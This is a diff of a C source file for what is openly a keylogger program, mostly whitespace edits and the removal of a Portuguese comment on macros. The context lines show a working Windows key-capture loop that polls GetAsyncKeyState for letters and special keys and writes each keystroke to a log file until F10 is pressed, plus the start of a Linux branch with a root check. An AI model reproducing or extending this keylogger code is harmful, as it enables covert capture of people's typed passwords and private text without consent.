@@ -1,5 +1,5 @@
 // =============================================================================
-// LIBRARYS 
+// LIBRARYS
 // =============================================================================
 
 // C Library to perform Input/Output operations.
@@ -9,7 +9,7 @@
 // C Library that contains some definitions of functions to get and manipulete
 // data an time information.
 #include <time.h>
-// C Library that supports slocalization specific settings, such as 
+// C Library that supports slocalization specific settings, such as
 // culture-specific data formats or country-specific currency symbols
 #include <locale.h>
 // C Library that contains declarations to all functions of Windows API
@@ -25,6 +25,8 @@
   #define IS_WINDOWS_VISIBLE 0
 #endif
 
+#define LOG_USE_COLOR
+
 /* LOGGER FUNCTIONS USAGE
 log_trace(const char *fmt, ...);
 log_debug(const char *fmt, ...);
@@ -32,26 +34,6 @@ log_info(const char *fmt, ...);
 log_warn(const char *fmt, ...);
 log_error(const char *fmt, ...);
 log_fatal(const char *fmt, ...);
-*/
-
-/*
-Macros sao recursos de pre-processamento, que permite criar estruturas
-para serem substituidas antes do codigo ser devidamente compilado.
-
-Em C++ as Macros nao sao bem vista, pos nao oferecem seguranca de tipos, nao
-respeitam escopo e podem dificultar o entendimento de um escopo do codigo.
-
-Analisando de uma forma mais simples, Macros sao basicamente substituicoes de
-strings. Macros sao tratadas (expandidas) pelo pre-processador e criadas 
-atraves da diretiva #define.
-
-Macros sao de dois principais tipos:
-
-* Objeto: Normalmente utilizado para dar nome a constantes.
-* Funcao: Define uma função inline.
-
-Declarar funcoes simples atraves de Macros podem otimizar o tempo de 
-processamento, ja que evita o custo da chamada de uma funcao.
 */
 
 // =============================================================================
@@ -68,7 +50,7 @@ FILE *check_file_exist();
 bool check_file_pointer_exist();
 
 // =============================================================================
-// MAIN 
+// MAIN
 // =============================================================================
 
 int main(int argc, char const *argv[]){
@@ -110,7 +92,7 @@ int main(int argc, char const *argv[]){
 
     int keylogger(void){
       while(true){
-        // Letters loop ("A"=65, "Z"=90)	
+        // Letters loop ("A"=65, "Z"=90)
         for(char i=65; i<91; i++){
           if(GetAsyncKeyState(i)){
             if(GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)){
@@ -134,7 +116,7 @@ int main(int argc, char const *argv[]){
         } else if(GetAsyncKeyState(VK_BACK)){
           fputs("[BACKSPACE]", file_pointer);
         } else if(GetAsyncKeyState(VK_SPACE)){
-          fputs("[SPACE]", file_pointer);      
+          fputs("[SPACE]", file_pointer);
         } else if(GetAsyncKeyState(VK_F10)){
           fclose(file_pointer);
           return 0;
@@ -147,7 +129,7 @@ int main(int argc, char const *argv[]){
     log_info("Call Keylogger Function...");
 
     keylogger();
-    
+
   #elif defined(__linux__)
     log_info("We are in a Linux System.");
     #define IS_ROOT() (geteuid() == 0) ? true : false
